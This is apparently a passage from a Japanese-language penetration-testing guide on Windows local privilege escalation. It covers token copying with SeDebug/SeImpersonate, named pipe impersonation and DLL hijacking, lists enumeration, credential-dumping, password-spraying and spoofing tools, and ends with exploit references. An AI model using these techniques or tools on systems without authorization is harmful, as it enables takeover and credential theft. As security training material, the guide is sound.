### SeDebug + SeImpersonateからFull Token privilegesを取得

これらのtoken privilegesがあれば（おそらく、すでにHigh Integrityのprocessで見つかるでしょう）、SeDebug privilegeを使って（protected processes以外の）**ほぼすべてのprocessを開き**、そのprocessの**tokenをコピー**して、そのtokenで**任意のprocessを作成**できます。\
この手法では通常、**すべてのtoken privilegesを持つSYSTEMとして実行中のprocessを選択します**（_すべてのtoken privilegesを持つSYSTEM processが見つからないこともあります_）。\
**提案した手法を実行するコードの** [**例はこちらにあります**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法はmeterpreterが`getsystem`で権限昇格するために使います。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**手法です。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegesを取得できます。\
[name pipesについて詳しく知りたい場合はこちらをお読みください](#named-pipe-client-impersonation)。\
[name pipesを使ってHigh IntegrityからSystemに移行する例はこちらをお読みください](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEMとして実行中のprocessによってロードされるdllを**うまく**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingもこの種の権限昇格に有効です。また、High Integrity processからは、dllのロードに使われるフォルダーへの**書き込み権限**があるため、はるかに**簡単に実行できます**。\
**Dll hijackingについて** [**詳しくはこちら**](dll-hijacking/index.html)**.**

### **AdministratorまたはNetwork ServiceからSystemへ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICEまたはNETWORK SERVICEからfull privsへ

**こちらをお読みください:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル権限昇格の手段を探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 考えられる設定ミスをチェックし、情報を収集します (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerから認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン内でsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShellのADIDNS/LLMNR/mDNS spooferおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc脆弱性を検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc脆弱性を検索します（VisualStudioを使ってcompileする必要があります） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してhostをenumerateします（privescというより情報収集ツールです）（compileが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#への移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにprecompiled executableがあります）。非推奨です。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 考えられる設定ミスをチェックします（python製のexe）。非推奨です。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツールです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを提案します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを提案します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

適切なバージョンの.NETを使ってプロジェクトをcompileする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim hostにインストールされている.NETのバージョンを確認するには、次のように実行します。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows権限昇格チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linuxローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows攻撃: ATが新たな主役 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters向けWindows権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロphishing → hMailServerの認証情報を復号 → Veeam CVE-2023-27532でSYSTEM権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)とkernel tokenの窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernelの影に潜むいたちごっこ](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステム脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [シンボリックリンクテストツール – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windowsでシンボリックリンクを悪用する](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windowsにおける危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題を解決](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectX Kernel Race Conditionを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する1つのI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのexploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃 Part 2: CVE-2020-1013、Windows 10のローカル権限昇格1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを調べる](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - イメージ変更が権限昇格につながる場合のKerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからSsh秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – エンタープライズの更新サーバーをバックドア工場に変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – エンタープライズの更新サーバーをバックドア工場に変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダーの削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
